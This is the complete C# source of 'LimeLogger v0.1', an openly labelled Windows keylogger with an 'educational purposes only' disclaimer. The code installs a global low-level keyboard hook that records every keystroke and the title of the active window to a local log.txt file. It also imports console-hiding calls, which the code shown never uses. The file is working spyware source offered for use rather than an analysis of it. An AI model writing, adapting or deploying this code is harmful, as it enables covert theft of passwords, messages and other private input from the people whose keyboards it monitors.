using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;


//       │ Author     : NYAN CAT
//       │ Name       : LimeLogger v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.


namespace LimeLogger
{
    class Program
    {

        public static void Main()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string currentKey = null;
                bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                currentKey = ((Keys)vkCode).ToString();

                if ((Keys)vkCode >= Keys.A && (Keys)vkCode <= Keys.Z)
                {
                    if (CapsLock)
                    {
                        currentKey = ((Keys)vkCode).ToString().ToUpper();
                    }
                    else
                    {
                        currentKey = ((Keys)vkCode).ToString().ToLower();
                    }
                }

                else if ((Keys)vkCode >= Keys.D0 && (Keys)vkCode <= Keys.D9)
                    currentKey = Convert.ToString((Keys)vkCode).Replace("D", null);

                else if ((Keys)vkCode >= Keys.NumPad0 && (Keys)vkCode <= Keys.NumPad9)
                    currentKey = Convert.ToString((Keys)vkCode).Replace("NumPad", null);

                else if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "[" + (Keys)vkCode + "]";

                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "OemPeriod":
                            currentKey = ".";
                            break;
                        case "Oemcomma":
                            currentKey = ",";
                            break;
                        case "Space":
                            currentKey = "[SPACE]";
                            break;
                        case "Return":
                            currentKey = "[ENTER]";
                            break;
                        case "escape":
                            currentKey = "[ESC]";
                            break;
                        case "LControlKey":
                            currentKey = "[Control]";
                            break;
                        case "RControlKey":
                            currentKey = "[Control]";
                            break;
                        case "RShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "LShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "Back":
                            currentKey = "[Back]";
                            break;
                        case "LWin":
                            currentKey = "[WIN]";
                            break;
                        case "Tab":
                            currentKey = "[Tab]";
                            break;
                        case "Divide":
                            currentKey = "[/]";
                            break;
                        case "Multiply":
                            currentKey = "[*]";
                            break;
                        case "Subtract":
                            currentKey = "[-]";
                            break;
                        case "Add":
                            currentKey = "[+]";
                            break;
                        case "Decimal":
                            currentKey = "[.]";
                            break;
                        case "Capital":
                            if (CapsLock == true)
                                currentKey = "[CAPSLOCK: OFF]";
                            else
                                currentKey = "[CAPSLOCK: ON]";
                            break;

                    }
                }

                using (StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true))
                {
                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                    {
                        Console.Write(currentKey);
                        sw.Write(currentKey);
                    }
                    else
                    {
                        Console.WriteLine(Environment.NewLine);
                        Console.WriteLine($"###  {GetActiveWindowTitle()} ###");
                        Console.Write(currentKey);
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
                        sw.Write(currentKey);
                    }
                }

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder(nChars);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                CurrentActiveWindowTitle = Path.GetFileName(Buff.ToString());
                return CurrentActiveWindowTitle;
            }
            else
            {
                return GetActiveProcessFileName();
            }
        }

        private static string GetActiveProcessFileName()
        {
            try
            {
                string pName;
                IntPtr hwnd = GetForegroundWindow();
                uint pid;
                GetWindowThreadProcessId(hwnd, out pid);
                Process p = Process.GetProcessById((int)pid);
                pName = Path.GetFileName(p.MainModule.FileName);

                return pName;
            }
            catch (Exception)
            {
                return "???";
            }
        }


        #region "Hooks & Native Methods"

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        private static string CurrentActiveWindowTitle;

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);
        #endregion

    }
}
